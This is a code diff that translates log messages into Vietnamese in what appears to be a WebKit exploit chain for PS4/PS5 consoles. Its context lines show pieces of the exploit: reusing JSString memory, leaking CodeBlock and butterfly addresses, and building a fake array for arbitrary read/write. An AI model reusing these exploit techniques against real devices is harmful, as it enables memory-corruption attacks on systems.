@@ -60,7 +60,7 @@ const [is_ps4, version] = (() => {
     throw RangeError(`invalid config.target: ${hex(value)}`);
   }
 
-  log(`console: PS${is_ps4 ? "4" : "5"} | firmware: ${hex(version)}`);
+  log(`Hệ Máy: PS${is_ps4 ? "4" : "5"} | Phiên Bản: ${hex(version)}`);
 
   return [is_ps4, version];
 })();
@@ -416,10 +416,10 @@ async function make_rdr(view) {
     await sleep();
     str_wait++;
   }
-  log(`JSString reused memory at loop: ${str_wait}`);
+  log(`JSString tái sử dụng bộ nhớ tại vòng lặp: ${str_wait}`);
 
   const idx = view.read32(off.strimpl_inline_str + marker_offset);
-  log(`str index: ${hex(idx)}`);
+  log(`chỉ số str: ${hex(idx)}`);
   log("view:");
   log(view);
 
@@ -431,11 +431,11 @@ async function make_rdr(view) {
   // ErrorInstance::create() will then create a new JSString initialized from
   // the StringImpl of the message argument
   const rstr = Error(strs[idx]).message;
-  log(`str len: ${hex(rstr.length)}`);
+  log(`độ dài str: ${hex(rstr.length)}`);
   if (rstr.length === 0xffffffff) {
     log("confirmed correct leaked");
     const addr = view.read64(off.strimpl_m_data).sub(off.strimpl_inline_str);
-    log(`view's buffer address: ${addr}`);
+    log(`địa chỉ buffer của view: ${addr}`);
     return new Reader(rstr, view);
   }
   die("JSString wasn't modified");
@@ -511,9 +511,9 @@ async function leak_code_block(reader, bt_size) {
   const chunkSize = is_ps4 && version < 0x900 ? 128 * KB : 1 * MB;
   const smallPageSize = 4 * KB;
   const search_addr = align(rdr.m_data, chunkSize);
-  log(`search addr: ${search_addr}`);
+  log(`địa chỉ tìm kiếm: ${search_addr}`);
 
-  log(`func_src:\n${cache[0]}\nfunc_src end`);
+  log(`mã nguồn hàm:\n${cache[0]}\nkết thúc mã nguồn hàm`);
   log("start find CodeBlock");
   let winning_off = null;
   let winning_idx = null;
@@ -558,7 +558,7 @@ async function leak_code_block(reader, bt_size) {
     gc();
     await sleep();
   }
-  log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
+  log(`vòng lặp ${find_cb_loop} winning_off: ${hex(winning_off)}`);
   log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
 
   log("CodeBlock.m_constantRegisters.m_buffer:");
@@ -569,8 +569,8 @@ async function leak_code_block(reader, bt_size) {
 
   const bt_addr = rdr.read64_at(bt_offset);
   const strs_addr = rdr.read64_at(strs_offset);
-  log(`immutable butterfly addr: ${bt_addr}`);
-  log(`string array passed to tag addr: ${strs_addr}`);
+  log(`địa chỉ butterfly bất biến: ${bt_addr}`);
+  log(`mảng string được truyền vào tag tại địa chỉ: ${strs_addr}`);
 
   log("JSImmutableButterfly:");
   rdr.set_addr(bt_addr);
@@ -742,7 +742,7 @@ async function make_arw(reader, view2, pop) {
   log(`fake: [${fake}]`);
 
   const test_val = 3;
-  log(`test setting fake[0] to ${test_val}`);
+  log(`thử gán fake[0] = ${test_val}`);
   fake[0] = test_val;
   if (fake[0] !== test_val) {
     die(`unexpected fake[0]: ${fake[0]}`);
